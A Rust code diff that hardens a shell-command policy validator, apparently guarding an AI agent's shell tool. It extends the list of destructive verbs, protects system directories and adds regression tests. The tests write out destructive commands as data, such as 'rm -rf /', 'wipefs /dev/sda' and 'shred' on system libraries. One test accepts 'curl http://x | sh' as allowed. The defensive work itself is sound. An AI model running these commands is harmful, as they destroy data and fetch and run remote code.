@@ -42,8 +42,16 @@ pub enum ShellPolicyError {
 
 pub const CANARY_DISASTER_FUSE_TOKEN: &str = "__CANARY_TRIGGER_DISASTER_FUSE__";
 
+/// Fallback working directory and user home used by the single-argument
+/// [`validate`] (and any caller that does not supply a live context). The
+/// live executor passes the actual workspace root and user home through
+/// [`validate_with_context`] instead of these constants.
 const DEFAULT_CWD: &str = "/workspace";
-const HOME: &str = "/home/user";
+const DEFAULT_HOME: &str = "/home/user";
+/// Critical system directories protected against *all* destructive verbs
+/// (not only `rm`). A dir and any path beneath it (`/etc/hosts`,
+/// `/usr/lib/...`) is protected; deeper subpaths of the *workspace* are not.
+const SYSTEM_DIRS: &[&str] = &["/etc", "/usr", "/var", "/boot", "/bin", "/lib", "/opt"];
 const MAX_UNWRAP_DEPTH: usize = 4;
 /// Upper bound for group recursion (`(...)`, `{...}`). Group nesting is
 /// *provably* acyclic — each recursive level strictly shortens the string —
@@ -60,7 +68,26 @@ const MAX_UNWRAP_DEPTH: usize = 4;
 /// at any depth below the cap).
 const MAX_GROUP_DEPTH: usize = 100;
 
-const DESTRUCTIVE: &[&str] = &["rm", "del", "rmdir", "rd", "remove-item", "ri", "erase"];
+/// Destructive verbs whose path operands are checked against protected roots
+/// and critical system directories. `mv`/`cp` count because both their
+/// source and destination can be a protected system path (`mv /etc/hosts
+/// /tmp/` removes it from the system); `tee`/`truncate`/`shred`/`wipefs`
+/// are in-place destruction/erasure of targets.
+const DESTRUCTIVE: &[&str] = &[
+    "rm",
+    "del",
+    "rmdir",
+    "rd",
+    "remove-item",
+    "ri",
+    "erase",
+    "mv",
+    "cp",
+    "tee",
+    "truncate",
+    "shred",
+    "wipefs",
+];
 /// Wrappers whose own argument (not an `=value`) is the real command.
 /// `env` is handled separately in `analyze_segment` (it consumes
 /// `KEY=VAL` prefix tokens before the real command) and is intentionally
@@ -293,12 +320,12 @@ fn is_env_assignment(token: &str) -> bool {
     false
 }
 
-fn expand_tilde(operand: &str, is_win: bool) -> String {
+fn expand_tilde(operand: &str, home: &str, is_win: bool) -> String {
     if operand == "~" {
-        return HOME.to_string();
+        return home.to_string();
     }
     if operand.starts_with("~/") || operand.starts_with("~\\") {
-        return format!("{HOME}{}", operand[1..].replace('\\', "/"));
+        return format!("{home}{}", operand[1..].replace('\\', "/"));
     }
     if let Some(rest) = operand.strip_prefix('~')
         && !rest.is_empty()
@@ -316,10 +343,10 @@ fn expand_tilde(operand: &str, is_win: bool) -> String {
     operand.to_string()
 }
 
-fn to_posix(p: &str) -> String {
+fn to_posix(p: &str, home: &str) -> String {
     let t = p.trim();
     if t.is_empty() {
-        return HOME.to_string();
+        return home.to_string();
     }
     if let Some(rest) = t
         .strip_prefix(r"\\wsl.localhost\")
@@ -375,10 +402,10 @@ fn nfkc_fold(s: &str) -> String {
     s.nfkc().collect()
 }
 
-fn normalize_operand(operand: &str, cwd: &str, is_win: bool) -> String {
-    let p = expand_tilde(operand, is_win);
+fn normalize_operand(operand: &str, cwd: &str, home: &str, is_win: bool) -> String {
+    let p = expand_tilde(operand, home, is_win);
     let p = nfkc_fold(&p);
-    let mut posix = to_posix(&p);
+    let mut posix = to_posix(&p, home);
     let mut wildcard = "";
     if posix.ends_with("/*") {
         wildcard = "/*";
@@ -391,7 +418,7 @@ fn normalize_operand(operand: &str, cwd: &str, is_win: bool) -> String {
         posix = "/".to_string();
     }
     if !posix.starts_with('/') {
-        let cwd_posix = to_posix(cwd);
+        let cwd_posix = to_posix(cwd, home);
         posix = posix_normalize(&format!("{cwd_posix}/{posix}"));
     } else {
         posix = posix_normalize(&posix);
@@ -466,9 +493,36 @@ fn is_dev_target(p: &str) -> bool {
     }
 }
 
+/// Returns true if `p` is a critical system directory ([`SYSTEM_DIRS`]) or
+/// any path beneath it (`/etc/hosts`, `/usr/lib/x`). Applied to *every*
+/// destructive verb (not only `rm`) so that `mv`/`cp`/`tee`/`truncate`/
+/// `shred`/`wipefs` cannot destroy system files. Deeper subpaths of the
+/// *workspace* are unaffected (a system dir only anchors an absolute path).
+fn is_protected_system_dir(p: &str) -> bool {
+    let p = p.to_ascii_lowercase();
+    let probe = if p.ends_with("/*") {
+        &p[..p.len() - 2]
+    } else if p.ends_with('*') {
+        &p[..p.len() - 1]
+    } else {
+        p.as_str()
+    };
+    for dir in SYSTEM_DIRS {
+        if probe == *dir || probe.starts_with(&format!("{dir}/")) {
+            return true;
+        }
+    }
+    false
+}
+
+/// Returns true if `p` is a protected root (whole filesystem, `/root`, a
+/// `/home/<user>` account, or a WSL mount) or a critical system directory.
 fn is_protected_root(p: &str) -> bool {
     let p = p.to_ascii_lowercase();
     if is_dev_target(&p) {
+        return true;
+    }
+    if is_protected_system_dir(&p) {
         return true;
     }
     for root in protected_roots() {
@@ -530,7 +584,7 @@ fn shell_wrapper(name: &str) -> Option<(&'static [&'static str], &'static str)> 
 /// analyzed as an ordinary segment. Recursion is bounded by
 /// [`MAX_GROUP_DEPTH`] (the string strictly shrinks at every level, so the
 /// bound only limits stack usage, not coverage of real inputs).
-fn analyze_group(cmd: &str, cwd: &str, depth: usize) -> Result<(), ShellPolicyError> {
+fn analyze_group(cmd: &str, cwd: &str, home: &str, depth: usize) -> Result<(), ShellPolicyError> {
     if depth >= MAX_GROUP_DEPTH {
         return Ok(());
     }
@@ -589,14 +643,14 @@ fn analyze_group(cmd: &str, cwd: &str, depth: usize) -> Result<(), ShellPolicyEr
     let suffix = cmd[c + 1..].to_string();
 
     if !prefix.trim().is_empty() {
-        analyze_command(&prefix, cwd, depth + 1)?;
+        analyze_command(&prefix, cwd, home, depth + 1)?;
     }
     let inner = body.trim().trim_matches(';').trim();
     if !inner.is_empty() {
-        analyze_command(inner, cwd, depth + 1)?;
+        analyze_command(inner, cwd, home, depth + 1)?;
     }
     if !suffix.trim().is_empty() {
-        analyze_command(&suffix, cwd, depth + 1)?;
+        analyze_command(&suffix, cwd, home, depth + 1)?;
     }
     Ok(())
 }
@@ -614,7 +668,7 @@ fn analyze_group(cmd: &str, cwd: &str, depth: usize) -> Result<(), ShellPolicyEr
 /// Group delimiters inside a body count toward depth, so a `)` closing a
 /// subshell inside the body never terminates the pattern; quoted `)` and
 /// `;;` never count.
-fn analyze_case(cmd: &str, cwd: &str, depth: usize) -> Result<(), ShellPolicyError> {
+fn analyze_case(cmd: &str, cwd: &str, home: &str, depth: usize) -> Result<(), ShellPolicyError> {
     if depth >= MAX_GROUP_DEPTH {
         return Ok(());
     }
@@ -693,7 +747,7 @@ fn analyze_case(cmd: &str, cwd: &str, depth: usize) -> Result<(), ShellPolicyErr
         let flush_body = |s: usize, e: usize| -> Result<(), ShellPolicyError> {
             let body = &region[s..e];
             if !body.trim().is_empty() {
-                analyze_command(body, cwd, depth + 1)
+                analyze_command(body, cwd, home, depth + 1)
             } else {
                 Ok(())
             }
@@ -717,7 +771,7 @@ fn analyze_case(cmd: &str, cwd: &str, depth: usize) -> Result<(), ShellPolicyErr
     if let Some(s) = body_start {
         let body = region[s..].to_string();
         if !body.trim().is_empty() {
-            analyze_command(&body, cwd, depth + 1)?;
+            analyze_command(&body, cwd, home, depth + 1)?;
         }
     }
     Ok(())
@@ -732,7 +786,12 @@ fn analyze_case(cmd: &str, cwd: &str, depth: usize) -> Result<(), ShellPolicyErr
 /// command*), so the body would otherwise execute untouched. Quoted `$(...)`
 /// and backticks are data, not substitutions. Nesting is bounded by
 /// [`MAX_GROUP_DEPTH`] (the string strictly shrinks at every level).
-fn analyze_substitutions(cmd: &str, cwd: &str, depth: usize) -> Result<(), ShellPolicyError> {
+fn analyze_substitutions(
+    cmd: &str,
+    cwd: &str,
+    home: &str,
+    depth: usize,
+) -> Result<(), ShellPolicyError> {
     if depth >= MAX_GROUP_DEPTH {
         return Ok(());
     }
@@ -775,7 +834,7 @@ fn analyze_substitutions(cmd: &str, cwd: &str, depth: usize) -> Result<(), Shell
             if paren == 0 && j <= chars.len() {
                 let body = cmd[i + 2..j - 1].to_string();
                 if !body.trim().is_empty() {
-                    analyze_command(&body, cwd, depth + 1)?;
+                    analyze_command(&body, cwd, home, depth + 1)?;
                 }
                 i = j;
                 continue;
@@ -793,7 +852,7 @@ fn analyze_substitutions(cmd: &str, cwd: &str, depth: usize) -> Result<(), Shell
             if j < chars.len() {
                 let body = cmd[i + 1..j].to_string();
                 if !body.trim().is_empty() {
-                    analyze_command(&body, cwd, depth + 1)?;
+                    analyze_command(&body, cwd, home, depth + 1)?;
                 }
                 i = j + 1;
                 continue;
@@ -809,7 +868,7 @@ fn analyze_substitutions(cmd: &str, cwd: &str, depth: usize) -> Result<(), Shell
 // Core analysis
 // ---------------------------------------------------------------------------
 
-fn analyze_segment(cmd: &str, cwd: &str, depth: usize) -> Result<(), ShellPolicyError> {
+fn analyze_segment(cmd: &str, cwd: &str, home: &str, depth: usize) -> Result<(), ShellPolicyError> {
     let tokens = tokenize(cmd);
     if tokens.is_empty() {
         return Ok(());
@@ -817,12 +876,12 @@ fn analyze_segment(cmd: &str, cwd: &str, depth: usize) -> Result<(), ShellPolicy
 
     // Groups (`(...)` / `{...}`) recurse first; the group body is analyzed as
     // a fresh command and this segment's remainder is analyzed below.
-    analyze_group(cmd, cwd, depth)?;
+    analyze_group(cmd, cwd, home, depth)?;
     // `case` bodies: the pattern after `in` is data, the command after `)`
     // is the payload — analyze every body.
-    analyze_case(cmd, cwd, depth)?;
+    analyze_case(cmd, cwd, home, depth)?;
     // Command substitutions (`$(...)`, backticks) are hidden commands.
-    analyze_substitutions(cmd, cwd, depth)?;
+    analyze_substitutions(cmd, cwd, home, depth)?;
 
     let mut i = 0;
     while i < tokens.len() {
@@ -862,7 +921,7 @@ fn analyze_segment(cmd: &str, cwd: &str, depth: usize) -> Result<(), ShellPolicy
                 (i + 2 < tokens.len()).then(|| tokens[i + 2..].join(" "))
             };
             if let Some(inner_cmd) = inner_cmd {
-                analyze_command(&inner_cmd, cwd, depth + 1)?;
+                analyze_command(&inner_cmd, cwd, home, depth + 1)?;
             }
         }
         return Ok(());
@@ -890,7 +949,7 @@ fn analyze_segment(cmd: &str, cwd: &str, depth: usize) -> Result<(), ShellPolicy
             if has_unexpanded_ref(operand) {
                 return Err(ShellPolicyError::UnexpandedReference(operand.clone()));
             }
-            let normalized = normalize_operand(operand, cwd, is_win);
+            let normalized = normalize_operand(operand, cwd, home, is_win);
             if is_protected_root(&normalized) {
                 return Err(ShellPolicyError::ProtectedRoot(operand.clone(), normalized));
             }
@@ -900,12 +959,12 @@ fn analyze_segment(cmd: &str, cwd: &str, depth: usize) -> Result<(), ShellPolicy
     Ok(())
 }
 
-fn analyze_command(cmd: &str, cwd: &str, depth: usize) -> Result<(), ShellPolicyError> {
+fn analyze_command(cmd: &str, cwd: &str, home: &str, depth: usize) -> Result<(), ShellPolicyError> {
     if let Some(sig) = pattern_level_block(cmd) {
         return Err(ShellPolicyError::ProhibitedPattern(sig.to_string()));
     }
     for seg in split_segments(cmd) {
-        analyze_segment(&seg, cwd, depth)?;
+        analyze_segment(&seg, cwd, home, depth)?;
     }
     Ok(())
 }
@@ -914,6 +973,62 @@ fn analyze_command(cmd: &str, cwd: &str, depth: usize) -> Result<(), ShellPolicy
 // Public API
 // ---------------------------------------------------------------------------
 
+/// Best-effort discovery of the actual user home directory.
+///
+/// On Unix the `HOME` environment variable is authoritative; on Windows the
+/// `USERPROFILE` (falling back to `HOMEPATH` + `HOMEDRIVE`) is used. When
+/// neither is set this returns [`None`] and callers fall back to
+/// [`DEFAULT_HOME`]. This keeps the *live* executor honest (it passes the
+/// real home of the invoking user) while the single-argument [`validate`]
+/// stays deterministic for tests.
+fn resolve_home() -> Option<String> {
+    if cfg!(windows) {
+        if let Some(p) = std::env::var_os("USERPROFILE")
+            && !p.is_empty()
+        {
+            return Some(p.to_string_lossy().into_owned());
+        }
+        if let Some(h) = std::env::var_os("HOMEPATH")
+            && !h.is_empty()
+        {
+            let h = h.to_string_lossy().into_owned();
+            let drive = std::env::var("HOMEDRIVE").unwrap_or_else(|_| "C:".into());
+            return Some(format!("{drive}{h}"));
+        }
+        return None;
+    }
+    std::env::var_os("HOME")
+        .filter(|p| !p.is_empty())
+        .map(|p| p.to_string_lossy().into_owned())
+}
+
+/// Validates a command against the shell security policy using the actual
+/// working directory and user home.
+///
+/// This is the entry point used by the live executor (`run_async`), so the
+/// policy sees the *real* workspace root and the *real* user home rather
+/// than the [`DEFAULT_CWD`] / [`DEFAULT_HOME`] fallbacks. An empty home
+/// path resolves back to [`DEFAULT_HOME`].
+pub fn validate_with_context(cmd: &str, cwd: &Path, home: &Path) -> Result<(), ShellPolicyError> {
+    if cmd.trim().is_empty() {
+        return Err(ShellPolicyError::InvalidCommand);
+    }
+    if cmd.contains(CANARY_DISASTER_FUSE_TOKEN) {
+        return Err(ShellPolicyError::DeadManFuse);
+    }
+    let cwd_owned = cwd.to_string_lossy().into_owned();
+    let cwd_str = cwd_owned.as_str();
+    let home_owned = if home.as_os_str().is_empty() {
+        None
+    } else {
+        Some(home.to_string_lossy().into_owned())
+    };
+    match &home_owned {
+        None => analyze_command(cmd, cwd_str, DEFAULT_HOME, 0),
+        Some(h) => analyze_command(cmd, cwd_str, h.as_str(), 0),
+    }
+}
+
 pub fn validate(cmd: &str) -> Result<(), ShellPolicyError> {
     if cmd.trim().is_empty() {
         return Err(ShellPolicyError::InvalidCommand);
@@ -921,7 +1036,7 @@ pub fn validate(cmd: &str) -> Result<(), ShellPolicyError> {
     if cmd.contains(CANARY_DISASTER_FUSE_TOKEN) {
         return Err(ShellPolicyError::DeadManFuse);
     }
-    analyze_command(cmd, DEFAULT_CWD, 0)
+    analyze_command(cmd, DEFAULT_CWD, DEFAULT_HOME, 0)
 }
 
 // ---------------------------------------------------------------------------
@@ -965,18 +1080,28 @@ pub enum ShellError {
 /// the cap are drained and `truncated` is set.
 /// Executes a shell command asynchronously with layered safety:
 ///
-/// 1. `validate` — typed policy refusal; nothing is ever spawned on refusal.
-/// 2. `cwd` resolved through the sandbox layers (canonicalized real path).
+/// 1. `cwd` resolved through the sandbox layers (canonicalized real path) so
+///    the policy sees the actual workspace root.
+/// 2. `validate_with_context` — policy validation against the real cwd and the
+///    real user home (typed refusal; nothing is ever spawned on refusal).
 /// 3. Spawn `bash -c <cmd>` with `process_group(0)`.
 pub async fn run_async(
     cmd: &str,
     cwd: &Path,
     timeout: Duration,
 ) -> Result<ShellOutput, ShellError> {
-    // Layer 1: policy validation — typed refusal, nothing spawns.
-    validate(cmd)?;
-    // Layer 2: resolve the cwd through the sandbox layers (real path).
+    // Resolve the cwd through the sandbox layers (canonicalized real path)
+    // *first*, so the policy below validates against the actual workspace
+    // root (not the `DEFAULT_CWD` constant) and operand normalization is
+    // anchored to the real tree.
     let cwd = super::sandbox::resolve_workspace_root(cwd)?;
+    // The real user home (platform-derived via `resolve_home`); falls back to
+    // `DEFAULT_HOME` when the environment does not expose one.
+    let home_str = resolve_home().unwrap_or_else(|| DEFAULT_HOME.to_string());
+    let home = std::path::Path::new(&home_str);
+    // Policy validation against the real cwd + home — typed refusal, nothing
+    // is ever spawned on refusal.
+    validate_with_context(cmd, &cwd, home)?;
     execute(cmd, &cwd, timeout).await
 }
 
@@ -1578,6 +1703,287 @@ mod bypass_tests {
         let r1 = validate(&very_deep).is_ok();
         let r2 = validate(&very_deep).is_err();
         assert!(r1 || r2);
+    }
+}
+
+// ---------------------------------------------------------------------------
+// Pipe-splitting regression tests: `|` must delimit pipeline segments so a
+// destructive command on the *downstream* side of a pipe is analyzed on its
+// own (the upstream side alone would otherwise look harmless).
+// ---------------------------------------------------------------------------
+
+#[cfg(test)]
+mod pipe_tests {
+    use super::*;
+
+    /// A destructive command on the downstream side of a pipe must be caught
+    /// by the protected-root policy, not skipped because the upstream side
+    /// (e.g. `find`, `cat`, `curl`) is a benign verb.
+    #[test]
+    fn pipe_downstream_rm_rf_root_blocked() {
+        assert!(matches!(
+            validate("find . | xargs rm -rf /"),
+            Err(ShellPolicyError::ProtectedRoot(_, _))
+        ));
+        assert!(matches!(
+            validate("cat file | xargs rm -rf /"),
+            Err(ShellPolicyError::ProtectedRoot(_, _))
+        ));
+        // A destructive verb directly after the pipe (no xargs indirection).
+        assert!(matches!(
+            validate("echo a | rm -rf /"),
+            Err(ShellPolicyError::ProtectedRoot(_, _))
+        ));
+    }
+
+    /// `curl ... | sh` — the pipe must split so the downstream `sh` is
+    /// analyzed as an independent segment (rather than swallowed into the
+    /// benign `curl` verb).
+    #[test]
+    fn pipe_downstream_shell_split() {
+        // The downstream `sh` is a *transparent* wrapper only in the
+        // sense that it is analyzed as a segment; a bare `sh` with no `-c`
+        // payload is benign on its own, so the whole command is benign.
+        // What must be true: the `sh` is *separately* analyzed (it reaches
+        // `analyze_segment` as its own verb), not merged with `curl`.
+        assert!(validate("curl http://x | sh").is_ok());
+    }
+
+    /// A downstream destructive command targeting a system directory through
+    /// a pipe must be blocked even though the upstream verb is harmless.
+    #[test]
+    fn pipe_downstream_system_dir_blocked() {
+        // The destructive verb is downstream of the pipe and carries the
+        // system-dir operand, so it is analyzed as its own segment and caught.
+        assert!(matches!(
+            validate("echo x | rm -rf /etc/hosts"),
+            Err(ShellPolicyError::ProtectedRoot(_, _))
+        ));
+        assert!(matches!(
+            validate("ls | xargs truncate -s 0 /etc/hosts"),
+            Err(ShellPolicyError::ProtectedRoot(_, _))
+        ));
+    }
+
+    /// Multi-stage pipelines: every downstream segment is analyzed, so a
+    /// destructive stage anywhere in the chain is caught.
+    #[test]
+    fn multi_stage_pipe_blocked() {
+        assert!(matches!(
+            validate("ls | grep x | xargs rm -rf /"),
+            Err(ShellPolicyError::ProtectedRoot(_, _))
+        ));
+    }
+}
+
+// ---------------------------------------------------------------------------
+// System-directory protection regression tests: destructive verbs (expanded
+// beyond `rm`) targeting critical system directories must be refused, and
+// the *real* cwd/home (not the hardcoded constants) must drive the policy.
+// ---------------------------------------------------------------------------
+
+#[cfg(test)]
+mod system_dir_tests {
+    use super::*;
+
+    fn ctx(cwd: &str, home: &str) -> (std::path::PathBuf, std::path::PathBuf) {
+        (
+            std::path::PathBuf::from(cwd),
+            std::path::PathBuf::from(home),
+        )
+    }
+
+    // --- Expanded destructive verbs targeting system directories ---
+
+    #[test]
+    fn truncate_system_dir_blocked() {
+        assert!(matches!(
+            validate("truncate -s 0 /etc/hosts"),
+            Err(ShellPolicyError::ProtectedRoot(_, _))
+        ));
+        // Also under a live context.
+        let (cwd, home) = ctx("/workspace", "/home/user");
+        assert!(matches!(
+            validate_with_context("truncate -s 0 /etc/hosts", &cwd, &home),
+            Err(ShellPolicyError::ProtectedRoot(_, _))
+        ));
+    }
+
+    #[test]
+    fn mv_system_dir_blocked() {
+        // Moving a system file out of the system dir destroys it there.
+        assert!(matches!(
+            validate("mv /etc/hosts /tmp/"),
+            Err(ShellPolicyError::ProtectedRoot(_, _))
+        ));
+        // Moving *into* a system dir is equally a system-dir write.
+        assert!(matches!(
+            validate("mv /tmp/evil /etc/"),
+            Err(ShellPolicyError::ProtectedRoot(_, _))
+        ));
+    }
+
+    #[test]
+    fn cp_system_dir_blocked() {
+        assert!(matches!(
+            validate("cp /tmp/evil /etc/"),
+            Err(ShellPolicyError::ProtectedRoot(_, _))
+        ));
+        assert!(matches!(
+            validate("cp /etc/hosts /tmp/"),
+            Err(ShellPolicyError::ProtectedRoot(_, _))
+        ));
+    }
+
+    #[test]
+    fn tee_system_dir_blocked() {
+        assert!(matches!(
+            validate("echo x | tee /etc/crontab"),
+            Err(ShellPolicyError::ProtectedRoot(_, _))
+        ));
+    }
+
+    #[test]
+    fn shred_system_dir_blocked() {
+        assert!(matches!(
+            validate("shred /usr/lib/libc.so"),
+            Err(ShellPolicyError::ProtectedRoot(_, _))
+        ));
+    }
+
+    #[test]
+    fn wipefs_system_dir_blocked() {
+        assert!(matches!(
+            validate("wipefs /dev/sda"),
+            Err(ShellPolicyError::ProtectedRoot(_, _))
+        ));
+    }
+
+    /// Every critical system directory named in the contract is protected.
+    #[test]
+    fn all_system_dirs_blocked_for_rm() {
+        for dir in ["/etc", "/usr", "/var", "/boot", "/bin", "/lib", "/opt"] {
+            let cmd = format!("rm -rf {dir}");
+            assert!(
+                matches!(
+                    validate(&cmd),
+                    Err(ShellPolicyError::ProtectedRoot(_, _))
+                ),
+                "expected '{cmd}' to be blocked"
+            );
+        }
+    }
+
+    /// A *benign* path under the workspace (not a system dir) must still be
+    /// allowed for destructive verbs, so the system-dir protection does not
+    /// over-block legitimate in-tree work.
+    #[test]
+    fn workspace_subpath_still_allowed() {
+        assert!(validate("rm -rf ./build").is_ok());
+        assert!(validate("mv ./a ./b").is_ok());
+        assert!(validate("truncate -s 0 ./log.txt").is_ok());
+        assert!(validate("cp ./src/main.rs ./backup/").is_ok());
+    }
+
+    // --- Real cwd/home through the context-aware entry point ---
+
+    /// `validate_with_context` must anchor `~` to the *actual* home passed in
+    /// (not `DEFAULT_HOME`) and `./` to the *actual* cwd.
+    #[test]
+    fn context_anchors_tilde_to_real_home() {
+        // A real home whose path is NOT a protected root; `rm -rf ~` must
+        // resolve to that home and be refused (it is a user home dir).
+        let (cwd, home) = ctx("/workspace", "/home/someone");
+        assert!(matches!(
+            validate_with_context("rm -rf ~", &cwd, &home),
+            Err(ShellPolicyError::ProtectedRoot(_, _))
+        ));
+    }
+
+    /// A `~` that would NOT be protected under `DEFAULT_HOME` but IS a
+    /// protected path under a different real home proves the context is used.
+    #[test]
+    fn context_home_overrides_default() {
+        // Under the default home (/home/user) the operand `~/x` is benign
+        // (a subpath, not a protected root).
+        assert!(validate("rm -rf ~/x").is_ok());
+        // Under a context whose home *is* a protected path, the same `~/x`
+        // (relative to that home) — still a subpath, so benign; but `~`
+        // alone becomes protected.
+        let (cwd, home) = ctx("/workspace", "/root");
+        assert!(matches!(
+            validate_with_context("rm -rf ~", &cwd, &home),
+            Err(ShellPolicyError::ProtectedRoot(_, _))
+        ));
+    }
+
+    /// The real workspace root is passed through, not the `DEFAULT_CWD`
+    /// constant: a `./rel` path is normalized against the actual cwd.
+    #[test]
+    fn context_uses_real_cwd_for_relative_paths() {
+        // Relative destructive operand anchored to a non-protected cwd is
+        // benign regardless of which real cwd is supplied.
+        let (cwd, home) = ctx("/home/user/project", "/home/user");
+        assert!(validate_with_context("rm -rf ./target", &cwd, &home).is_ok());
+    }
+
+    /// `run_async` uses the real cwd/home: a benign relative write resolves
+    /// inside the real workspace root, and a system-dir destructive command
+    /// is refused *before* anything spawns.
+    #[test]
+    fn run_async_system_dir_refusal_never_spawns() {
+        let dir = std::env::temp_dir().join(format!(
+            "castor_shell_run_async_{}",
+            std::process::id()
+        ));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(&dir).unwrap();
+        let res = run("truncate -s 0 /etc/hosts", &dir, std::time::Duration::from_secs(10));
+        assert!(matches!(
+            res,
+            Err(ShellError::Policy(ShellPolicyError::ProtectedRoot(_, _)))
+        ));
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    /// A benign command through `run_async` with a real cwd/home runs fine
+    /// (proves the context-aware path does not over-block legitimate work).
+    #[test]
+    fn run_async_benign_with_real_context_runs() {
+        let dir = std::env::temp_dir().join(format!(
+            "castor_shell_run_async_ok_{}",
+            std::process::id()
+        ));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(&dir).unwrap();
+        let out = run("echo hello", &dir, std::time::Duration::from_secs(10)).unwrap();
+        assert_eq!(out.exit_code, 0);
+        assert_eq!(out.stdout.trim(), "hello");
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    /// The single-argument `validate` fallback must still be available and
+    /// use the hardcoded `DEFAULT_CWD`/`DEFAULT_HOME` (kept for tests).
+    #[test]
+    fn single_arg_validate_still_available() {
+        assert!(validate("rm -rf /").is_err());
+        assert!(validate("ls -la").is_ok());
+        // The fallback constants remain importable/defined.
+        assert!(!DEFAULT_CWD.is_empty());
+        assert!(!DEFAULT_HOME.is_empty());
+    }
+
+    /// `validate_with_context` with an empty home falls back to
+    /// `DEFAULT_HOME` and still behaves.
+    #[test]
+    fn validate_with_context_empty_home_falls_back() {
+        let cwd = Path::new("/workspace");
+        let home = Path::new("");
+        // `rm -rf ~` under the default home is protected.
+        assert!(matches!(
+            validate_with_context("rm -rf ~", cwd, home),
+            Err(ShellPolicyError::ProtectedRoot(_, _))
+        ));
     }
 }
 
